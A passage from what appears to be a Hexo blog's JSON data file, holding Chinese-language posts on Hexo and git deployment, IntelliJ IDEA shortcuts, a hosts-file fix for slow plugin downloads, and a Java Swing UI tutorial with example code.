&quot;本次提交的描述信息&quot;</code>提交描述信息</p>\n<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>\n<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>\n<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>\n<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>\n<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>\n<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>\n<p>如果不嫌麻烦的话,每次写完文章</p>\n<p>git bash 五连击</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br><span class=\"line\">hexo d</span><br><span class=\"line\">git add .</span><br><span class=\"line\">git commit -m <span class=\"string\">&quot;new page&quot;</span></span><br><span class=\"line\">git push origin <span class=\"built_in\">source</span></span><br></pre></td></tr></table></figure>\n\n<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>\n<p>有时因为一些文件并不是直接创建或者删除,而是做了修改,git可能提示会需要merge</p>\n<p>这个时候采用强制覆盖本地文件的方式</p>\n<p><code>git fetch --all</code></p>\n<p><code>git reset --hard origin/分支名称</code></p>"},{"title":"hexo的一些使用技巧","date":"2021-12-03T05:48:36.000Z","typora-root-url":"..","_content":"\n##### 配置文章摘要显示\n\n打开next配置文件\n\n将该项设置为true\n\n![image-20211205134957202](/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png)\n\n显示文章摘要有两种方法\n\n1.在需要显示截断的地方添加`<!--more-->`标签\n\n2.在`front-matter`中添加`description`,`description`中的内容就会添加到首页上面,并且它的优先级高于`<!--more-->`标签\n\n##### 配置评论邮件提醒\n\nhttps://blog.51cto.com/u_11378682/3661775\n","source":"_posts/hexo的一些使用技巧.md","raw":"---\ntitle: hexo的一些使用技巧\ndate: 2021-12-03 13:48:36\ntags:\n    - hexo\ncategories: hexo\ntypora-root-url: ..\n---\n\n##### 配置文章摘要显示\n\n打开next配置文件\n\n将该项设置为true\n\n![image-20211205134957202](/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png)\n\n显示文章摘要有两种方法\n\n1.在需要显示截断的地方添加`<!--more-->`标签\n\n2.在`front-matter`中添加`description`,`description`中的内容就会添加到首页上面,并且它的优先级高于`<!--more-->`标签\n\n##### 配置评论邮件提醒\n\nhttps://blog.51cto.com/u_11378682/3661775\n","slug":"hexo的一些使用技巧","published":1,"updated":"2022-01-13T11:00:57.682Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9m8000lgsw940zv9qj4","content":"<h5 id=\"配置文章摘要显示\"><a href=\"#配置文章摘要显示\" class=\"headerlink\" title=\"配置文章摘要显示\"></a>配置文章摘要显示</h5><p>打开next配置文件</p>\n<p>将该项设置为true</p>\n<p><img src=\"/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png\" alt=\"image-20211205134957202\"></p>\n<p>显示文章摘要有两种方法</p>\n<p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>\n<p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>\n<h5 id=\"配置评论邮件提醒\"><a href=\"#配置评论邮件提醒\" class=\"headerlink\" title=\"配置评论邮件提醒\"></a>配置评论邮件提醒</h5><p><a href=\"https://blog.51cto.com/u_11378682/3661775\">https://blog.51cto.com/u_11378682/3661775</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h5 id=\"配置文章摘要显示\"><a href=\"#配置文章摘要显示\" class=\"headerlink\" title=\"配置文章摘要显示\"></a>配置文章摘要显示</h5><p>打开next配置文件</p>\n<p>将该项设置为true</p>\n<p><img src=\"/images/hexo%E8%AE%BE%E7%BD%AE%E6%96%87%E7%AB%A0%E6%98%BE%E7%A4%BA%E9%83%A8%E5%88%86%E5%86%85%E5%AE%B9/image-20211205134957202.png\" alt=\"image-20211205134957202\"></p>\n<p>显示文章摘要有两种方法</p>\n<p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>\n<p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>\n<h5 id=\"配置评论邮件提醒\"><a href=\"#配置评论邮件提醒\" class=\"headerlink\" title=\"配置评论邮件提醒\"></a>配置评论邮件提醒</h5><p><a href=\"https://blog.51cto.com/u_11378682/3661775\">https://blog.51cto.com/u_11378682/3661775</a></p>\n"},{"title":"IDEA快捷键总结","date":"2021-12-13T09:21:24.000Z","_content":"\nctrl+shift+alt：多行操作\npsvm：生成main()方法；\nfori：生成for循环；\nCtrl+Alt+v：自动补齐返回值类型\nctrl+o：覆写方法\nctrl+i：实现接口中的方法\nctrl+shift+u：大小写转换\nCTRL+SHIFT+Z：取消撤销\nAlt＋Insert：生成构造方法、getter、setter\nctrl+y：删除当前行\nCtrl+Shift+J：将选中的行合并成一行\nctrl+g：定位到某一行\nCtrl+Shitft+向下箭头：将光标所在的代码块向下整体移动\nCtrl+Shift+向上箭头：将光标所在的代码块向上整体移动\nAlt+Shift+向下箭头：将行向下移动\nAlt+Shift+向上箭头：将行向上移动\nCtrl+F：在当前文件中查找\nCtrl+R：替换字符串\nCtrl+Shift+F:在全局文件中查找字符串\nCtrl+Shift+R：在全局中替换字符串\nCtrl+Shift+Enter：自动补齐{}或者分号;\nShift+Enter：在当前行的下方开始新行\nCtrl+Alt+Enter：在当前行的上方插入新行\nCtrl+Delete：删除光标所在至单词结尾处的所有字符\n","source":"_posts/idea快捷键总结.md","raw":"---\ntitle: IDEA快捷键总结\ndate: 2021-12-13 17:21:24\ntags:\n      - IDEA\n      - 快捷键\ncategories: 小技巧\n---\n\nctrl+shift+alt：多行操作\npsvm：生成main()方法；\nfori：生成for循环；\nCtrl+Alt+v：自动补齐返回值类型\nctrl+o：覆写方法\nctrl+i：实现接口中的方法\nctrl+shift+u：大小写转换\nCTRL+SHIFT+Z：取消撤销\nAlt＋Insert：生成构造方法、getter、setter\nctrl+y：删除当前行\nCtrl+Shift+J：将选中的行合并成一行\nctrl+g：定位到某一行\nCtrl+Shitft+向下箭头：将光标所在的代码块向下整体移动\nCtrl+Shift+向上箭头：将光标所在的代码块向上整体移动\nAlt+Shift+向下箭头：将行向下移动\nAlt+Shift+向上箭头：将行向上移动\nCtrl+F：在当前文件中查找\nCtrl+R：替换字符串\nCtrl+Shift+F:在全局文件中查找字符串\nCtrl+Shift+R：在全局中替换字符串\nCtrl+Shift+Enter：自动补齐{}或者分号;\nShift+Enter：在当前行的下方开始新行\nCtrl+Alt+Enter：在当前行的上方插入新行\nCtrl+Delete：删除光标所在至单词结尾处的所有字符\n","slug":"idea快捷键总结","published":1,"updated":"2022-01-13T09:22:59.737Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9ma000qgsw9f3cr2l18","content":"<p>ctrl+shift+alt：多行操作<br>psvm：生成main()方法；<br>fori：生成for循环；<br>Ctrl+Alt+v：自动补齐返回值类型<br>ctrl+o：覆写方法<br>ctrl+i：实现接口中的方法<br>ctrl+shift+u：大小写转换<br>CTRL+SHIFT+Z：取消撤销<br>Alt＋Insert：生成构造方法、getter、setter<br>ctrl+y：删除当前行<br>Ctrl+Shift+J：将选中的行合并成一行<br>ctrl+g：定位到某一行<br>Ctrl+Shitft+向下箭头：将光标所在的代码块向下整体移动<br>Ctrl+Shift+向上箭头：将光标所在的代码块向上整体移动<br>Alt+Shift+向下箭头：将行向下移动<br>Alt+Shift+向上箭头：将行向上移动<br>Ctrl+F：在当前文件中查找<br>Ctrl+R：替换字符串<br>Ctrl+Shift+F:在全局文件中查找字符串<br>Ctrl+Shift+R：在全局中替换字符串<br>Ctrl+Shift+Enter：自动补齐{}或者分号;<br>Shift+Enter：在当前行的下方开始新行<br>Ctrl+Alt+Enter：在当前行的上方插入新行<br>Ctrl+Delete：删除光标所在至单词结尾处的所有字符</p>\n","site":{"data":{}},"excerpt":"","more":"<p>ctrl+shift+alt：多行操作<br>psvm：生成main()方法；<br>fori：生成for循环；<br>Ctrl+Alt+v：自动补齐返回值类型<br>ctrl+o：覆写方法<br>ctrl+i：实现接口中的方法<br>ctrl+shift+u：大小写转换<br>CTRL+SHIFT+Z：取消撤销<br>Alt＋Insert：生成构造方法、getter、setter<br>ctrl+y：删除当前行<br>Ctrl+Shift+J：将选中的行合并成一行<br>ctrl+g：定位到某一行<br>Ctrl+Shitft+向下箭头：将光标所在的代码块向下整体移动<br>Ctrl+Shift+向上箭头：将光标所在的代码块向上整体移动<br>Alt+Shift+向下箭头：将行向下移动<br>Alt+Shift+向上箭头：将行向上移动<br>Ctrl+F：在当前文件中查找<br>Ctrl+R：替换字符串<br>Ctrl+Shift+F:在全局文件中查找字符串<br>Ctrl+Shift+R：在全局中替换字符串<br>Ctrl+Shift+Enter：自动补齐{}或者分号;<br>Shift+Enter：在当前行的下方开始新行<br>Ctrl+Alt+Enter：在当前行的上方插入新行<br>Ctrl+Delete：删除光标所在至单词结尾处的所有字符</p>\n"},{"title":"IDEA插件下载慢怎么解决","date":"2022-01-01T07:33:59.000Z","_content":"\n想学习Javaweb,但是用的是社区版的idea,并不支持web开发,需要下载一个名叫Smart Tomcat的插件,下载要么很慢,要么失败,在网络上寻到一个很好用的方法,也可以适用于其他集成开发环境的插件下载\n\n首先用站长工具测试访问插件域名最快的节点http://tool.chinaz.com/speedtest\n\nidea下载插件请求的域名是   plugins.jetbrains.com\n\n测试完成后找到一个延迟最低的最好和自己运营商一致的ip\n\n![image-20220113154149803](https://gitee.com/blue_satchel/images/raw/master/image-20220113154149803.png)\n\n然后打开hosts文件,修改域名和ip的对应关系\n\n`C:\\Windows\\System32\\drivers\\etc\\hosts`\n\n![image-20220113154237161](https://gitee.com/blue_satchel/images/raw/master/image-20220113154237161.png)\n\n","source":"_posts/idea插件下载慢怎么解决.md","raw":"---\ntitle: IDEA插件下载慢怎么解决\ndate: 2022-01-1 15:33:59\ntags:\n      - 插件下载\n      - 小技巧\ncategories: 小技巧\n---\n\n想学习Javaweb,但是用的是社区版的idea,并不支持web开发,需要下载一个名叫Smart Tomcat的插件,下载要么很慢,要么失败,在网络上寻到一个很好用的方法,也可以适用于其他集成开发环境的插件下载\n\n首先用站长工具测试访问插件域名最快的节点http://tool.chinaz.com/speedtest\n\nidea下载插件请求的域名是   plugins.jetbrains.com\n\n测试完成后找到一个延迟最低的最好和自己运营商一致的ip\n\n![image-20220113154149803](https://gitee.com/blue_satchel/images/raw/master/image-20220113154149803.png)\n\n然后打开hosts文件,修改域名和ip的对应关系\n\n`C:\\Windows\\System32\\drivers\\etc\\hosts`\n\n![image-20220113154237161](https://gitee.com/blue_satchel/images/raw/master/image-20220113154237161.png)\n\n","slug":"idea插件下载慢怎么解决","published":1,"updated":"2022-01-15T15:29:58.057Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9mb000sgsw9btqrcdyv","content":"<p>想学习Javaweb,但是用的是社区版的idea,并不支持web开发,需要下载一个名叫Smart Tomcat的插件,下载要么很慢,要么失败,在网络上寻到一个很好用的方法,也可以适用于其他集成开发环境的插件下载</p>\n<p>首先用站长工具测试访问插件域名最快的节点<a href=\"http://tool.chinaz.com/speedtest\">http://tool.chinaz.com/speedtest</a></p>\n<p>idea下载插件请求的域名是   plugins.jetbrains.com</p>\n<p>测试完成后找到一个延迟最低的最好和自己运营商一致的ip</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113154149803.png\" alt=\"image-20220113154149803\"></p>\n<p>然后打开hosts文件,修改域名和ip的对应关系</p>\n<p><code>C:\\Windows\\System32\\drivers\\etc\\hosts</code></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113154237161.png\" alt=\"image-20220113154237161\"></p>\n","site":{"data":{}},"excerpt":"","more":"<p>想学习Javaweb,但是用的是社区版的idea,并不支持web开发,需要下载一个名叫Smart Tomcat的插件,下载要么很慢,要么失败,在网络上寻到一个很好用的方法,也可以适用于其他集成开发环境的插件下载</p>\n<p>首先用站长工具测试访问插件域名最快的节点<a href=\"http://tool.chinaz.com/speedtest\">http://tool.chinaz.com/speedtest</a></p>\n<p>idea下载插件请求的域名是   plugins.jetbrains.com</p>\n<p>测试完成后找到一个延迟最低的最好和自己运营商一致的ip</p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113154149803.png\" alt=\"image-20220113154149803\"></p>\n<p>然后打开hosts文件,修改域名和ip的对应关系</p>\n<p><code>C:\\Windows\\System32\\drivers\\etc\\hosts</code></p>\n<p><img src=\"https://gitee.com/blue_satchel/images/raw/master/image-20220113154237161.png\" alt=\"image-20220113154237161\"></p>\n"},{"title":"java_ui","date":"2021-12-27T15:25:13.000Z","typora-root-url":"..","description":"java折磨人的ui","_content":"\n#### JFrame\n\nJFrame初体验\n\n```java\nimport javax.swing.*;\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setSize(400,250);\n        jf.setLocation(400,300);//setLocation设置出现在屏幕中的位置\n        //setBounds()可以一次性完成上面两句\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);//设置点击关闭后关闭\n        /*关闭方式参数\n        DO_NOTHING_ON_CLOSE//什么也不做\n        HIDE_ON_CLOSE//隐藏当前窗口\n        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源\n        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211227233144855.png\" alt=\"image-20211227233144855\" style=\"zoom: 67%;\" />\n\n#### JDialog\n\n继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似\n\n`JDialog:可当成JFrame使用,但必须从属于JFrame`\n\n构造函数 **一般用第三种**\n\n```java\nJDialog();\nJDialog(Frame f);//指定父窗口\nJDialog(Frame f,String title);//指定父窗口+标题\n```\n\n关闭方式只有三种,一般选第二种\n\nDO_NOTHING_ON_CLOSE//什么也不做\nHIDE_ON_CLOSE//隐藏当前窗口\nDISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源\n\n例子\n\n```java\nimport javax.swing.*;\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setSize(400,250);\n        //setLocation设置出现在屏幕中的位置\n        jf.setLocation(400,300);\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n\n        JDialog jd=new JDialog(jf,\"jdialog\");\n        jd.setBounds(500,400,300,300);\n        jd.setVisible(true);\n        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);\n    }\n}\n\n```\n\n\n\n<img src=\"/images/java-ui/image-20211227234154224.png\" alt=\"image-20211227234154224\" style=\"zoom:67%;\" />\n\n关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响\n\n\n\n#### 组件和面板\n\n例子\n\n组件一般添加到Jpanel和JScrollPane再添加到JFrame\n\nJScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setVisible(true);//设置窗口可见\n        jf.setTitle(\"hello\");//设置标题\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n        JButton jb1=new JButton(\"btn1\");\n        JButton jb2=new JButton(\"btn2\");\n        JPanel jp=new JPanel(new FlowLayout());\n        jp.add(jb1);\n        jp.add(jb2);\n        jf.add(jp);\n\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211227235300734.png\" alt=\"image-20211227235300734\" style=\"zoom:67%;\" />\n\n##### 标签组件JLabel\n\n和C#中的label一样,类似于只读的文本框\n\nJLabel构造方法\n\n```java\n以下参数都可以省略\nJLabel(String str,Icon icon,int aligment);//设置文本,图标,水平对齐方式\n```\n\n##### 按钮组件JButton\n\nJButton构造方法\n\n```java\n以下参数都可以省略\nJButton(String text,Icon icon)//设置文本,图标\n```\n\n其他JButton类内自带方法\n\n```java\nsetTooltipText(String text)//设置提示文本\nsetBorderPainted();//设置边界是否显示\nsetEnabled();//设置按钮知否可用\n```\n\n##### 单选按钮组件JRadioButton\n\nJRadioButton构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJRadioButton(String text,Icon icon,boolean selected)//指定文字,图标,是否选中\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());\n        jf.setTitle(\"hello\");//设置标题\n        JRadioButton jrb1=new JRadioButton(\"男\");\n        JRadioButton jrb2=new JRadioButton(\"女\");\n        ButtonGroup group=new ButtonGroup();\n        group.add(jrb1);\n        group.add(jrb2);\n        jf.add(jrb1);\n        jf.add(jrb2);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228001003287.png\" alt=\"image-20211228001003287\" style=\"zoom:67%;\" />\n\n##### 复选框组件JCheckBox\n\nJCheckBox构造方法\n\n```java\nJCheckBox(Icon icon,boolean checked);//指定图标,是否被选中\nJCheckBox(String text,boolean checked);//指定文字,是否被选中\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JCheckBox jcb1=new JCheckBox(\"摆烂\",true);\n        JCheckBox jcb2=new JCheckBox(\"足球\");\n        JCheckBox jcb3=new JCheckBox(\"音乐\");\n        JCheckBox jcb4=new JCheckBox(\"睡觉\");\n        jf.add(jcb1);\n        jf.add(jcb2);\n        jf.add(jcb3);\n        jf.add(jcb4);\n        \n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228001621601.png\" alt=\"image-20211228001621601\" style=\"zoom:67%;\" />\n\n##### 下拉列表组件JComboBox\n\nJComboBox构造方法\n\n```java\nJComboBox();//常用\nJComboBox(ComboBoxModel dataModel);//使用listModel建立一个下拉列表\nJComBox(Object[] arrayData);\nJComboBox(Vector vector);\n```\n\n方法\n\n`addItem添加下拉内容`\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JComboBox box=new JComboBox();\n        box.addItem(\"---请选择你的学历---\");\n        box.addItem(\"高中\");\n        box.addItem(\"大学\");\n        box.addItem(\"研究生\");\n        jf.add(box);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228131636660.png\" alt=\"image-20211228131636660\" style=\"zoom:67%;\" />\n\n##### 菜单栏组件\n\nJmenuBar  Jmenu  JmenuItem\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class S9_3 {\n    public static void main(String[] args) {\n        JFrame jFrame=new JFrame(\"记事本\");\n        jFrame.setBounds(500,400,700,700);\n        jFrame.setLayout(new FlowLayout(FlowLayout.LEFT));\n        JMenuBar bar=new JMenuBar();\n        JMenu menu1=new JMenu(\"文件(F)\");\n        JMenuItem item1=new JMenuItem(\"新建\");\n        JMenuItem item2=new JMenuItem(\"保存\");\n        JMenuItem item3=new JMenuItem(\"另存为\");\n        menu1.add(item1);\n        menu1.add(item2);\n        menu1.add(item3);\n        JMenu menu2=new JMenu(\"编辑(E)\");\n        JMenu menu3=new JMenu(\"格式(O)\");\n        JMenu menu4=new JMenu(\"查看(V)\");\n        JMenu menu5=new JMenu(\"帮助(H)\");\n        JMenuItem item4=new JMenuItem(\"查看帮助(H)\");\n        JMenuItem item5=new JMenuItem(\"发送反馈(F)\");\n        JMenuItem item6=new JMenuItem(\"关于记事本(A)\");\n        menu5.add(item4);\n        menu5.add(item5);\n        menu5.add(item6);\n        bar.add(menu1);\n        bar.add(menu2);\n        bar.add(menu3);\n        bar.add(menu4);\n        bar.add(menu5);\n\n\n        jFrame.add(bar);\n        JTextArea jTextArea=new JTextArea(40,63);\n        jFrame.add(jTextArea);\n        jFrame.setVisible(true);\n        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n\n}\n```\n\n<img src=\"/images/java-ui/image-20211229002557142.png\" alt=\"image-20211229002557142\" style=\"zoom:67%;\" />\n\n##### 文本组件JTextField\n\n构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJTextField(Document docModel,String text,int fieldWidth);//指定文本框,文字,文本框长度\n```\n\n`getText();//获取输入的内容`\n\n##### 密码框组件JPasswordField\n\n构造方法\n\n```java\n以下参数都可以省略,一般只用指定文字即可\nJPasswordField(Document docModel,String text,int fieldWidth);//指定文本框,文字,文本框长度\n```\n\n常用方法\n\n```java\nsetEchoChar('*');//设置回显字符\ngetText();//获取输入的内容\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout(FlowLayout.LEFT));//设置流式布局\n        jf.setTitle(\"hello\");//设置标题\n        JLabel jlabel1=new JLabel(\"账号:\");\n        JTextField username=new JTextField(10);\n        jf.add(jlabel1);\n        jf.add(username);\n        JLabel jlabel2=new JLabel(\"密码:\");\n        JPasswordField password=new JPasswordField(10);\n        password.setEchoChar('*');//设置回显字符\n\n        jf.add(jlabel2);\n\n        jf.add(password);\n\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228133823317.png\" alt=\"image-20211228133823317\" style=\"zoom:67%;\" />\n\n##### 文本域组件JTextArea\n\n构造函数\n\n```java\nJTextArea(Document doc,String text,int rows,int cols);//指定文本模型,默认文字,长,宽\n```\n\n常用方法\n\n```java\nsetLineWrap();//设置文本域是否自动换行true or false\ngetText();//获取输入的内容\n```\n\n#### 常用布局\n\n##### 流布局FlowLayout\n\n所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置\n\n构造方法\n\n```java\n//参数都可省略,一般只写对齐方式\nFlowLayout(int aligment,int horizGap,int vertGap);//设置对齐方式,上下偏移\naligment取值:\nFlowLayout.LEFT=0;\nFlowLayout.CENTER=1;\nFlowLayout.RIGHT=2;\n```\n\n##### 边界布局BorderLayout\n\n边界布局是默认的布局管理方式,边界布局将容器分成了东`BorderLayout.NORTH`,南,西,北,中5个区域\n\n在add的时候指定边界\n\n`jf.add(button,BorderLayout.NORTH);`\n\n<img src=\"/images/java-ui/image-20211228135034235.png\" alt=\"image-20211228135034235\" style=\"zoom:67%;\" />\n\n##### 网格布局GridLayout\n\n将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变\n\n构造方法\n\n```java\nGridLayout(int rows,int columns,int horizGap,int vertGap);//指定行数,列数,水平间隔.垂直间隔\n```\n\n例子\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new GridLayout(3,3,5,5));//设置网格布局\n        jf.setTitle(\"test\");//设置标题\n        JButton jButton1=new JButton(\"A\");\n        JButton jButton2=new JButton(\"B\");\n        JButton jButton3=new JButton(\"C\");\n        JButton jButton4=new JButton(\"D\");\n        JButton jButton5=new JButton(\"E\");\n        JButton jButton6=new JButton(\"F\");\n        JButton jButton7=new JButton(\"G\");\n        JButton jButton8=new JButton(\"H\");\n        jf.add(jButton1);\n        jf.add(jButton2);\n        jf.add(jButton3);\n        jf.add(jButton4);\n        jf.add(jButton5);\n        jf.add(jButton6);\n        jf.add(jButton7);\n        jf.add(jButton8);\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228135556932.png\" alt=\"image-20211228135556932\" style=\"zoom:67%;\" />\n\n#### 常用的事件监听器\n\n一个事件模型中有三个对象:事件源,事件,以及监听程序\n\n##### 事件监听机制\n\n- 事件源    事件发生的地方\n- 事件        要发生的事情\n- 事件处理 针对发生的事情做出的处理方案\n- 事件监听 把事件源和事件关联起来\n\n##### 两种监听器\n\n|                | 事件        | 事件源                     | 监听接口       | 方法                                       |\n| -------------- | ----------- | -------------------------- | -------------- | ------------------------------------------ |\n| 动作事件监听器 | ActionEvent | JButton,JlistmJTextField等 | ActionListener | addActionListener(),removeActionListener() |\n| 焦点事件监听器 | FocusEvent  | Component及其派生          | FocusListener  | addFocusListener(),removeFocusListener()   |\n\n使用步骤\n\n1. 新建一个组件(如Button)\n2. 将该组件添加到相应的面板(如JFrame)\n3. 注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)\n4. 定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)\n\n**一般用匿名内部类方式实现**\n\n例子\n\n```java\njla.addFocusListener(new FocusListener(){\n    public void focusLost(FocusEvent e){\n        //失去焦点的时候做的事情\n    }\n    public void focusGained(FocusEvent e){\n        //获取焦点的时候做的事情\n    }  \n});\n```\n\n```java\njb.addActionListener(new ActionListener(){\n\t@Override\n    public void actionPerformed(ActionEvent e){\n     //单击鼠标时执行   \n    }\n});\n```\n\n```java\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\n\npublic class jFrameTest {\n    public static void main(String[] args) {\n        JFrame jf=new JFrame();\n        jf.setBounds(400,300,400,250);\n        jf.setLayout(new FlowLayout());//设置网格布局\n        jf.setTitle(\"test\");//设置标题\n        JTextArea jTextArea=new JTextArea();\n        jTextArea.setLineWrap(true);\n        JButton jButton=new JButton(\"希望你对你对人生也是这个态度\");\n        jf.add(jTextArea);\n        jf.add(jButton);\n        jButton.addActionListener(new AbstractAction() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                jTextArea.append(\"啊对对对\");\n            }\n        });\n\n        jf.setVisible(true);\n        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);\n    }\n}\n\n```\n\n<img src=\"/images/java-ui/image-20211228141558056.png\" alt=\"image-20211228141558056\" style=\"zoom:67%;\" />\n\n##### 综合实践\n\n```java\nimport javax.swing.*;\nimport javax.swing.filechooser.FileNameExtensionFilter;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.FileReader;\nimport java.io.FileWriter;\n\npublic class S9_2 {\n    static String path;\n    public static void readText(String path,Object obj) throws Exception{\n        JTextArea jTextArea=(JTextArea) obj;\n        FileReader fileReader=new FileReader(path);\n        BufferedReader bufferedReader=new BufferedReader(fileReader);\n\n        String line;\n        while((line=bufferedReader.readLine())!=null){\n            jTextArea.append(line);\n        }\n        bufferedReader.close();\n        fileReader.close();\n    }\n    public static void saveText(String path,Object obj)throws Exception{\n        JTextArea jTextArea=(JTextArea) obj;\n        BufferedWriter bufferedWriter=new BufferedWriter(new FileWriter(path));\n        bufferedWriter.write(jTextArea.getText());\n        bufferedWriter.flush();\n        bufferedWriter.close();\n    }\n    public static void main(String[] args) {\n        JFrame jFrame=new JFrame(\"S9_2\");\n        jFrame.setLayout(new FlowLayout(FlowLayout.CENTER));\n        jFrame.setBounds(500,500,600,500);\n        JTextArea jTextArea=new JTextArea(20,50);\n        JTextField jTextField=new JTextField(35);\n        //把文本域放进jScrollPane让其拥有滚动条\n        JScrollPane jScrollPane=new JScrollPane(jTextArea);\n        JLabel jLabel=new JLabel(\"File:\");\n        JButton Browse=new JButton(\"Browse\");\n        Browse.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                \n             \t//文件选择组件\n                JFileChooser chooser =new JFileChooser(\"C:/\");\n                FileNameExtensionFilter filter = new FileNameExtensionFilter(\n                        